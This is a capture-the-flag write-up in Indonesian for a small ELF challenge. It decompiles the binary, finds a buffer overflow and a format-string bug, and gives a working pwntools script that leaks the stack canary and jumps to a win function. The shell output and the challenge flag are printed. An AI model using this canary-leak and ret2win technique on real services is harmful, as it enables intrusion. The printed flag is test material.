# hehe

# analysis & exploit step by step

- indentifikasi awal
aku melihat metadata 
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(hehe)
└> file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9af5414795d226fb2aea4f30f165ce0af62280fe, for GNU/Linux 3.2.0, not stripped
┌[rotalactf]-[LAPTOP-6QMID52F]-(hehe)
└> pwn checksec chall
[*] '/home/rotalactf/reno/pwn/LKS/hehe/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
┌[rotalactf]-[LAPTOP-6QMID52F]-(hehe)
└> ./chall
+---------------------------+
| 1. Create name            |
| 2. Print name             |
| 0. Exit                   |
+---------------------------+
Choice: 1
Format: "name %s age %d"
Enter input: name ambatukam age 100
[*] Stored.
+---------------------------+
| 1. Create name            |
| 2. Print name             |
| 0. Exit                   |
+---------------------------+
Choice: 2

--- Stored Data ---
name : ambatukam
age : 100
-------------------
+---------------------------+
| 1. Create name            |
| 2. Print name             |
| 0. Exit                   |
+---------------------------+
Choice:
```

program ini merupakan file binary arsitektur x86-64 dan memiliki proteksi canary. selain itu program ini memiliki layanan membuat nama dan mencetaknya. 

ternyata terdapat kerentanan yang cukup fatal pada fungsi Create name dan print name nya. yaitu buffer overflow dan format string.

hasil decompile binary :
```C
void create_name(undefined8 param_1,undefined8 param_2,undefined8 param_3)

{
  size_t sVar1;
  long in_FS_OFFSET;
  char local_98 [136]; 
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 40);
  printf("Format: \"%s\"\n",param_1);
  printf("Enter input: ");
  fgets(local_98,256,stdin);
  sVar1 = strcspn(local_98,"\n");
  local_98[sVar1] = '\0';
  __isoc99_sscanf(local_98,param_1,param_2,param_3);
  puts("[*] Stored.");
  if (local_10 != *(long *)(in_FS_OFFSET + 40)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
void print_name(char *param_1,uint *param_2)

{
  puts("\n--- Stored Data ---");
  printf("name : ");
  printf(param_1);
  printf("\nage : %d\n",(ulong)*param_2);
  puts("-------------------");
  return;
}

void win(void)

{
  puts("Congratulations!");
  system("/bin/sh");
  return;
}


```
- buffer overflow
`  char local_98 [136]; ` ukuran buffer : 136  bytes  
` fgets(local_98,256,stdin);` input menerima hingga 256 bytes  

- format string
`printf(param_1);` string tidak di beri format string saat di print. maka jika string itu sendiri adalah format string. selama valid maka akan di eksekusi oleh printf

- fungsi win
fungsi ini mengembalikan sebuah shell, namun tidak dipanggil di main. jadi fungsi ini tidak akan di eksekusi oleh alur program normal.

[?] kerentanan
- kerentanan format string
- kerentanan buffer overflow
[!] rencana exploit
1. meleak value canary melalui kerentanan format string
2. menimpa return address dengan alamat win 
3. mengakses shell server dan mengambil string flag



```Python
from pwn import *

context.log_level = "error"
SERV = 'serv'
PORT = 1234

ch = b"Choice: "
ei = b"input: "

elf = ELF("./chall")
ret_gadget = p64(0x000000000040101a)
win = p64(elf.sym.win)

def payload():
    for i in range(32):
        payload = f"name %{i}$p age 0"
        io = process("./chall")
        io.sendlineafter(ch,b"1")
        io.sendlineafter(ei,payload.encode())
        io.sendlineafter(ch,b"2")
        io.recvuntil(b'name : ')    
        data = io.recvline().strip().decode()
        
        if data[-2:] == "00" and len(data) == 18:
            print(f'index {i} : {data}')
            canary = p64(int(data,16))
            payload = b"A"*136 + canary + ret_gadget + ret_gadget + win
            
            io.sendlineafter(ch,b"1")
            io.sendlineafter(ei,payload)
            io.interactive()
payload()   
```
result : 
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(hehe)
└> python3 exploit.py
index 25 : 0xb66609e3f9959700
[*] Stored.
Congratulations!
/home/rotalactf/reno/pwn/LKS/hehe
$ ls
chall  exploit.py  flag.txt
$ cat flag.txt
LKS{fb154a184edd8f083bdf0024d15dc944}
```

done
